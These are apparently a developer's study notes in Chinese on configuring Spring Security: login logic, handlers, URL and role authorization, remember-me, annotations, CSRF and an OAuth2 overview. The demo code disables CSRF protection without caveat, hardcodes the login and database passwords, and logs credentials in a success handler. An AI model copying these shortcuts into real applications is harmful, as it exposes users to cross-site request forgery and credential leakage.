<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  自定义登录逻辑</span></span><br><span class="line"><span class="comment"> *      1、实现UserDetailsService接口</span></span><br><span class="line"><span class="comment"> *      2、比较用户名</span></span><br><span class="line"><span class="comment"> *      3、比较密码(注册时已经进行加密，匹配成功返回UserDetail)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDetailServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserDetailsService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> PasswordEncoder passwordEncoder;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UserDetails <span class="title">loadUserByUsername</span><span class="params">(String username)</span> <span class="keyword">throws</span> UsernameNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;admin&quot;</span>.equals(username))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UsernameNotFoundException(<span class="string">&quot;用户名不存在&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String encode = passwordEncoder.encode(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="comment">//authorityList,权限集合</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(username,encode,</span><br><span class="line">                AuthorityUtils.commaSeparatedStringToAuthorityList(<span class="string">&quot;admin,normal&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="自定义登录页面"><a href="#自定义登录页面" class="headerlink" title="自定义登录页面"></a>自定义登录页面</h2><p>修改配置类 修改配置类中主要是设置哪个页面是登录页面。配置类需要继承WebSecurityConfigurerAdapte,并重 写 configure 方法。</p>
<ul>
<li><p>successForwardUrl() ：登录成功后跳转地址 </p>
</li>
<li><p>loginPage() ：登录页面 </p>
</li>
<li><p>loginProcessingUrl ：登录页面表单提交地址，此地址可以不真实存在。 </p>
</li>
<li><p>antMatchers() ：匹配内容 </p>
</li>
<li><p>permitAll() ：允许</p>
</li>
<li><p>failureForwardUrl(“  “):登录失败后页面,POST请求</p>
</li>
</ul>
<p>在控制器类中添加控制器方法，方法映射路径/error。此处要注意：由于是 POST 请求访问/error。 所以如果返回值直接转发到 error.html 中，即使有效果，控制台也会报警告，提示 error.html 不支持 POST 访问方式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义登录页面配置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        http.formLogin() <span class="comment">//表单提交方式</span></span><br><span class="line">                <span class="comment">//自定义登录页面</span></span><br><span class="line">                .loginPage(<span class="string">&quot;/Login.html&quot;</span>)</span><br><span class="line">                <span class="comment">//必须和表单提交的接口一样,执行自定义登录逻辑</span></span><br><span class="line">                .loginProcessingUrl(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">                <span class="comment">//登录成功后页面,POST请求</span></span><br><span class="line">                .successForwardUrl(<span class="string">&quot;/toMain&quot;</span>)</span><br><span class="line">                <span class="comment">//登录失败后页面,POST请求</span></span><br><span class="line">                .failureForwardUrl(<span class="string">&quot;/toError&quot;</span>);</span><br><span class="line">        <span class="comment">//授权</span></span><br><span class="line">        http.authorizeRequests()</span><br><span class="line">                <span class="comment">//放行/login.html</span></span><br><span class="line">                .antMatchers(<span class="string">&quot;/Login.html&quot;</span>,<span class="string">&quot;/error.html&quot;</span>).permitAll()</span><br><span class="line">                <span class="comment">//所有请求都必须认证才能访问，必须登录</span></span><br><span class="line">                <span class="comment">//已登录后不会被拦截</span></span><br><span class="line">                .anyRequest().authenticated();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//跨站请求伪造</span></span><br><span class="line">        http.csrf().disable();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="登录账号密码参数"><a href="#登录账号密码参数" class="headerlink" title="登录账号密码参数"></a>登录账号密码参数</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    用户名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username123&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password123&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>UsernamePasswordAuthenticationFilter</code>过滤器（post请求，username，password）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UsernamePasswordAuthenticationFilter</span> <span class="keyword">extends</span> <span class="title">AbstractAuthenticationProcessingFilter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String SPRING_SECURITY_FORM_USERNAME_KEY = <span class="string">&quot;username&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String SPRING_SECURITY_FORM_PASSWORD_KEY = <span class="string">&quot;password&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AntPathRequestMatcher DEFAULT_ANT_PATH_REQUEST_MATCHER = <span class="keyword">new</span> AntPathRequestMatcher(<span class="string">&quot;/login&quot;</span>, <span class="string">&quot;POST&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> String usernameParameter = <span class="string">&quot;username&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String passwordParameter = <span class="string">&quot;password&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> postOnly = <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>自定义入参</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">http.formLogin() <span class="comment">//表单提交方式</span></span><br><span class="line">        <span class="comment">//自定义入参</span></span><br><span class="line">        .usernameParameter(<span class="string">&quot;username123&quot;</span>)</span><br><span class="line">        .passwordParameter(<span class="string">&quot;password123&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="登录成功处理器"><a href="#登录成功处理器" class="headerlink" title="登录成功处理器"></a>登录成功处理器</h2><ul>
<li>应用于前后端分离，而不是通过Controller层进行跳转</li>
<li>继承<code>SimpleUrlAuthenticationSuccessHandler</code>自定义成功处理器</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onAuthenticationSuccess</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        Authentication authentication)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">       <span class="comment">//重定向</span></span><br><span class="line">        response.sendRedirect(url);</span><br><span class="line">        User user= (User) authentication.getCredentials();</span><br><span class="line">        <span class="comment">//password安全考虑会设置为null</span></span><br><span class="line">        System.out.println(user.getUsername()+<span class="string">&quot;  &quot;</span>+user.getPassword());</span><br><span class="line">        <span class="comment">//获得权限</span></span><br><span class="line">        System.out.println(user.getAuthorities());</span><br><span class="line">        clearAuthenticationAttributes(request);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.successHandler(<span class="keyword">new</span> MyAuthenticationSuccessHandler(<span class="string">&quot;http://baidu.com&quot;</span>));</span><br></pre></td></tr></table></figure>

<h2 id="登录失败处理器"><a href="#登录失败处理器" class="headerlink" title="登录失败处理器"></a>登录失败处理器</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onAuthenticationFailure</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    AuthenticationException exception)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    response.sendRedirect(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.failureHandler(<span class="keyword">new</span> MyAuthenticationFailuerHandler(<span class="string">&quot;/error.html&quot;</span>));</span><br></pre></td></tr></table></figure>

<h2 id="退出登录"><a href="#退出登录" class="headerlink" title="退出登录"></a>退出登录</h2><p>为了实现更好的效果，通常添加退出的配置。默认的退出 url 为 /logout ，退出成功后跳转到 /login? logout</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//退出登录</span></span><br><span class="line">http.logout()</span><br><span class="line">    <span class="comment">//自定义退出登录</span></span><br><span class="line"><span class="comment">//    .logoutUrl(&quot;/user/logout&quot;)</span></span><br><span class="line">    <span class="comment">//退出登录成功的url</span></span><br><span class="line">    .logoutSuccessUrl(<span class="string">&quot;/login.html&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/user/logout&quot;</span>&gt;</span>退出<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h1><p>在配置类中 http.authorizeRequests() 主要是对<code>url</code>进行控制，也就是我们所说的授权（访问控制）。</p>
<p><strong>配置顺序</strong>影响了之后授权效果，越是具体的应该放在前面，越 是笼统的应该放到后面。</p>
<ul>
<li><p><code>antMachers</code></p>
<ul>
<li><code>？</code>匹配一个字符，<code>*</code>匹配多个字符，<code>**</code>匹配多个目录</li>
<li>在实际项目中经常需要放行所有静态资源，下面演示放行 js 文件夹下所有脚本文件。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.antMatchers(&quot;&#x2F;js&#x2F;**&quot;,&quot;&#x2F;css&#x2F;**&quot;).permitAll() </span><br></pre></td></tr></table></figure>

<ul>
<li>还有一种配置方式是只要是.js 文件都放行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">antMatchers(&quot;&#x2F;**&#x2F;*.js&quot;).permitAll()</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>regexMachers</code>正则表达式</p>
</li>
</ul>
<p>使用正则表达式进行匹配。和 antMatchers() 主要的区别就是参数， antMatchers() 参数是 ant 表达式， regexMatchers() 参数是正则表达式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.antMatchers(<span class="string">&quot;/Login.html&quot;</span>,<span class="string">&quot;/error.html&quot;</span>,<span class="string">&quot;/**/*.css&quot;</span>).permitAll()</span><br><span class="line">   <span class="comment">//匹配为postMapping</span></span><br><span class="line">.regexMatchers(HttpMethod.POST,<span class="string">&quot;/login&quot;</span>).permitAll()</span><br></pre></td></tr></table></figure>

<h2 id="控制访问"><a href="#控制访问" class="headerlink" title="控制访问"></a>控制访问</h2><blockquote>
<p>自定义登录逻辑中返回的UserDetails对象</p>
<ul>
<li>权限控制,严格区分大小写,权限不够会出现403状态码</li>
</ul>
</blockquote>
<p>Spring Security 中还支持很多其他权限控制。这些方法一般都用于用 户已经被认证后，判断用户是否具有特定的要求。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//authorityList,权限集合</span></span><br><span class="line"><span class="comment">//role基于角色</span></span><br><span class="line"><span class="comment">//admin,normal为权限</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> User(username,encode,</span><br><span class="line">        AuthorityUtils.commaSeparatedStringToAuthorityList(<span class="string">&quot;admin,normal,ROLE_abc&quot;</span>));</span><br></pre></td></tr></table></figure>

<h3 id="基于权限"><a href="#基于权限" class="headerlink" title="基于权限"></a>基于权限</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.antMatchers(<span class="string">&quot;/Authentication.html&quot;</span>).hasAuthority(<span class="string">&quot;normal&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="基于角色"><a href="#基于角色" class="headerlink" title="基于角色"></a>基于角色</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.antMatchers(<span class="string">&quot;/Authentication.html&quot;</span>).hasRole(<span class="string">&quot;abc&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="基于IP地址"><a href="#基于IP地址" class="headerlink" title="基于IP地址"></a>基于IP地址</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.antMatchers(<span class="string">&quot;/Authentication.html&quot;</span>).hasIpAddress(<span class="string">&quot;127.0.0.1&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="自定义403页面"><a href="#自定义403页面" class="headerlink" title="自定义403页面"></a>自定义403页面</h2><p>使用 Spring Security 时经常会看见 403（无权限）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//异常处理</span></span><br><span class="line">http.exceptionHandling().accessDeniedHandler(accessDeniedHandler);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAccessDeniedHandler</span> <span class="keyword">implements</span> <span class="title">AccessDeniedHandler</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, AccessDeniedException accessDeniedException)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        <span class="comment">//响应状态码，403</span></span><br><span class="line">        response.setStatus(HttpServletResponse.SC_FORBIDDEN);</span><br><span class="line">        <span class="comment">//以json格式</span></span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/json;charset=utf-8&quot;</span>);</span><br><span class="line">        PrintWriter writer = response.getWriter();</span><br><span class="line">        writer.write(<span class="string">&quot;&#123;\&quot;status\&quot;:\&quot;error,\&quot;msg\&quot;:\&quot;权限不足\&quot;&#125;&quot;</span>);</span><br><span class="line">        writer.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="基于表达式的访问控制"><a href="#基于表达式的访问控制" class="headerlink" title="基于表达式的访问控制"></a>基于表达式的访问控制</h2><p>之前学习的登录用户权限判断实际上底层实现都是调用access(表达式)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String permitAll = <span class="string">&quot;permitAll&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String denyAll = <span class="string">&quot;denyAll&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String anonymous = <span class="string">&quot;anonymous&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String authenticated = <span class="string">&quot;authenticated&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String fullyAuthenticated = <span class="string">&quot;fullyAuthenticated&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String rememberMe = <span class="string">&quot;rememberMe&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="使用Access"><a href="#使用Access" class="headerlink" title="使用Access"></a>使用Access</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.antMatchers(<span class="string">&quot;/Authentication.html&quot;</span>).access(<span class="string">&quot;hasRole(&#x27;abc&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="自定义Access"><a href="#自定义Access" class="headerlink" title="自定义Access"></a>自定义Access</h3><blockquote>
<p>编写一个自定义权限控制</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  用于自定义权限Access</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccessServiceImpl</span> <span class="keyword">implements</span> <span class="title">AccessService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPermission</span><span class="params">(HttpServletRequest request, Authentication authentication)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获得对象主体</span></span><br><span class="line">        Object obj = authentication.getPrincipal();</span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UserDetails)&#123;</span><br><span class="line">            UserDetails userDetails= (UserDetails) obj;</span><br><span class="line">            <span class="comment">//获取权限,grantedAuthority泛型集合</span></span><br><span class="line">            Collection&lt;? extends GrantedAuthority&gt; authorities =</span><br><span class="line">                                                        userDetails.getAuthorities();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> authorities.contains(<span class="keyword">new</span> SimpleGrantedAuthority(request.getRequestURI()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.anyRequest().access(<span class="string">&quot;@accessServiceImpl.hasPermission(httpServletRequest,authentication)&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Remember-me"><a href="#Remember-me" class="headerlink" title="Remember me"></a>Remember me</h2><p>用户只需要在登录时添加remember-me复选框，取值为true，Spring Security会自动把用户信息存储到数据源中，以后就可以不登录进行访问</p>
<p>Spring Security实现该功能<strong>依赖</strong>于Spring JDBC</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--       mybatis依赖--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--      MySql数据库依赖--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>配置datasource</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/security?characterEncoding=UTF-8&amp;useSSL=false&amp;serverTimezone=GMT</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br></pre></td></tr></table></figure>

<p><code>tokenReposity</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PersistentTokenRepository <span class="title">getRepository</span><span class="params">()</span></span>&#123;</span><br><span class="line">        JdbcTokenRepositoryImpl jdbcTokenRepository = <span class="keyword">new</span> JdbcTokenRepositoryImpl();</span><br><span class="line">        <span class="comment">//设置数据源</span></span><br><span class="line">        jdbcTokenRepository.setDataSource(dataSource);</span><br><span class="line">        <span class="comment">//自动建表，第一次启动时开启，跌二次启动时注释</span></span><br><span class="line"><span class="comment">//        jdbcTokenRepository.setCreateTableOnStartup(true);</span></span><br><span class="line">        <span class="keyword">return</span> jdbcTokenRepository;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//记住我</span></span><br><span class="line">http.rememberMe()</span><br><span class="line">        <span class="comment">//设置数据源</span></span><br><span class="line">        .tokenRepository(persistentTokenRepository)</span><br><span class="line">        <span class="comment">//设置超时时间</span></span><br><span class="line">        .tokenValiditySeconds(<span class="number">60</span>)</span><br><span class="line">        .userDetailsService(userDetailsService);</span><br></pre></td></tr></table></figure>



<h1 id="注解访问控制"><a href="#注解访问控制" class="headerlink" title="注解访问控制"></a>注解访问控制</h1><p>注解默认不开启，需要通过<code>@EnableGlobalMethodSecurity</code></p>
<p>如果设置的条件允许，程序正常执行，如果不允许会报500</p>
<p>注解可以写到Service接口或方法中，也可以写到Controller或Controller方法，通常情况下都是写在控制器方法中，控制接口URL是否允许被访问</p>
<p><img src="https://csn.damyoung.cn/image-20201208160543960.png" alt="image-20201208160543960"></p>
<h2 id="Secured"><a href="#Secured" class="headerlink" title="@Secured"></a>@Secured</h2><p>判断用户是否具有角色，能写在方法或类上，参数以ROLE_开头</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//UserDetails</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> User(username,encode,</span><br><span class="line">        AuthorityUtils.commaSeparatedStringToAuthorityList(<span class="string">&quot;admin,normal,ROLE_abc&quot;</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.successForwardUrl(<span class="string">&quot;/toMain&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Secured(&quot;ROLE_abc&quot;)</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/toMain&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:Success.html&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PreAuthorize-PostAuthorize"><a href="#PreAuthorize-PostAuthorize" class="headerlink" title="@PreAuthorize/@PostAuthorize"></a>@PreAuthorize/@PostAuthorize</h2><p>方法或类级别的注解+<strong>access表达式</strong></p>
<ul>
<li>@PreAuthorize 执行前先判断权限</li>
<li>PostAuthorize 方法或类执行之后判断权限</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PreAuthorize(&quot;hasRole(&#x27;abc&#x27;)&quot;)</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/toMain&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:Success.html&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//跨站请求伪造</span></span><br><span class="line">http.csrf().disable();</span><br></pre></td></tr></table></figure>

<p>跨域：只要网络协议，ip地址，端口中任何一个不相同都是跨域请求</p>
<p>客户端与服务进行交互时，由于http协议本身是无状态协议，所以引入了cookie进行记录客户端身份。在cookie中会存放session id用来识别客户端身份，在跨域的请求下，session id可能被第三方恶意挟持，通过这个session id向服务端发起请求时，服务端会认为这个请求是合法的，可能发生很多意想不到的事情。</p>
<p>Spring-security默认开启CSRF，默认会拦截请求，进行CSRF处理。CSRF为了保证不是其他第三方网站访问，要求访问时携带参数名为_csrf值为token(token在服务端产生)的内容，如果token和服务端的token匹配成功，则正常访问。</p>
<h1 id="Oauth2协议"><a href="#Oauth2协议" class="headerlink" title="Oauth2协议"></a>Oauth2协议</h1><p>oAuth是Open Authorization的简写。</p>
<p>OAUTH协议为用户资源的授权提供了一个安全的、开放而又简易的标准。同时，任何第三方都可以使用OAUTH认证服务，任何服务提供商都可以实现自身的OAUTH认证服务，因而OAUTH是开放的。</p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h3 id="微信认证"><a href="#微信认证" class="headerlink" title="微信认证"></a>微信认证</h3><p><img src="https://csn.damyoung.cn/image-20201208193713137.png" alt="image-20201208193713137"></p>
<h3 id="Oauth2认证流程"><a href="#Oauth2认证流程" class="headerlink" title="Oauth2认证流程"></a>Oauth2认证流程</h3><p><img src="https://csn.damyoung.cn/image-20201208193803706.png" alt="image-20201208193803706"></p>
<h3 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h3><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>本身不存储资源，需要通过资源拥有者的授权去请求资源服务器的资源，比如：Android客户端、Web 客户端（浏览器端）、微信客户端等。</p>
<h4 id="资源拥有者"><a href="#资源拥有者" class="headerlink" title="资源拥有者"></a>资源拥有者</h4><p>通常为用户，也可以是应用程序，即该资源的拥有者。 </p>
<h4 id="授权服务器（也称认证服务器）"><a href="#授权服务器（也称认证服务器）" class="headerlink" title="授权服务器（也称认证服务器）"></a>授权服务器（也称认证服务器）</h4><p>用来对资源拥有的身份进行认证、对访问资源进行授权。客户端要想访问资源需要通过认证服务器由资 源拥有者授权后方可访问。 </p>
<h4 id="资源服务器"><a href="#资源服务器" class="headerlink" title="资源服务器"></a>资源服务器</h4><p>存储资源的服务器，比如，网站用户管理服务器存储了网站用户信息，网站相册服务器存储了用户的相 册信息，微信的资源服务存储了微信的用户信息等。客户端最终访问资源服务器获取资源信息。 </p>
<h4 id="常用术语"><a href="#常用术语" class="headerlink" title="常用术语"></a>常用术语</h4><ul>
<li>客户凭证(client Credentials) ：客户端的clientId和密码用于认证客户 </li>
<li>令牌(tokens) ：授权服务器在接收到客户请求后，颁发的访问令牌 </li>
<li>作用域(scopes) ：客户请求访问令牌时，由资源拥有者额外指定的细分权限(permission)</li>
</ul>
<h4 id="令牌类型"><a href="#令牌类型" class="headerlink" title="令牌类型"></a>令牌类型</h4><ul>
<li>授权码 ：仅用于授权码授权类型，用于交换获取访问令牌和刷新令牌 </li>
<li>访问令牌 ：用于代表一个用户或服务直接去访问受保护的资源 </li>
<li>刷新令牌 ：用于去授权服务器获取一个刷新访问令牌 </li>
<li>BearerToken ：不管谁拿到Token都可以访问资源，类似现金 Proof of Possession(PoP) </li>
<li>Token ：可以校验client是否对Token有明确的拥有权</li>
</ul>
<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul>
<li>更安全，客户端不接触用户密码，服务器端更易集中保护  </li>
<li>短寿命和封装的token </li>
<li>资源服务器和授权服务器解耦 集中式授权，简化客户端 HTTP/JSON友好，易于请求和传递token </li>
</ul>
<h2 id="授权模式"><a href="#授权模式" class="headerlink" title="授权模式"></a>授权模式</h2><h3 id="授权码模式"><a href="#授权码模式" class="headerlink" title="授权码模式"></a>授权码模式</h3><p><img src="http://qkm6g478k.hn-bkt.clouddn.com/image-20201208200327236.png" alt="image-20201208200327236"></p>
<ul>
<li>简化</li>
</ul>
<p><img src="http://qkm6g478k.hn-bkt.clouddn.com/image-20201208200404058.png" alt="image-20201208200404058"></p>
<h3 id="密码模式"><a href="#密码模式" class="headerlink" title="密码模式"></a>密码模式</h3><p><img src="http://qkm6g478k.hn-bkt.clouddn.com/image-20201208200451192.png" alt="image-20201208200451192"></p>
